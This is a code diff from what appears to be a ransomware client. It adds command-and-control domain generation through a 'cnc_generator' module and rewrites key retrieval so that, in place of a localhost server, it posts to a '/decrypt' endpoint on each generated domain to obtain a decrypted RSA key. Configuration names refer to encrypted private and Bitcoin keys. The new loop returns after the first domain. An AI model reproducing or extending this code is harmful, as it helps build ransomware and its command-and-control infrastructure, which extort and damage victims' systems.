@@ -3,6 +3,7 @@ import requests
 from core.utils.file_ops import read_data_from_file
 from core.utils.generators import generate_client_id
 from base64 import b64encode, b64decode
+from core.comms.cnc_generator import generate_domains
 from core.config import (
     ENCRYPTED_LOCAL_RSA_PRIVATE_KEY_FILE_LOCATION,
     ENCRYPTED_BITCOIN_KEY_LOCATION,
@@ -48,8 +49,11 @@ def send_request(server, body):
         dict: The response parameters
     """
     logger.info(f"Sending request to {server}")
-    response = requests.post(url=f"{server}/decrypt", json=body).json()
-    return b64decode(response.get("key"))
+    try:
+        response = requests.post(url=f"{server}/decrypt", json=body).json()
+        return b64decode(response.get("key"))
+    except Exception as err:
+        logger.error(err)
 
 
 def get_decrypted_key_from_server():
@@ -59,6 +63,8 @@ def get_decrypted_key_from_server():
         bytes: The decrypted local RSA key
     """   
     body = build_request()
-    key = send_request(server="http://localhost:5000", body=body)
-    return key
+    domains = generate_domains()
+    for domain in domains:
+        key = send_request(server=domain, body=body)
+        return key
 
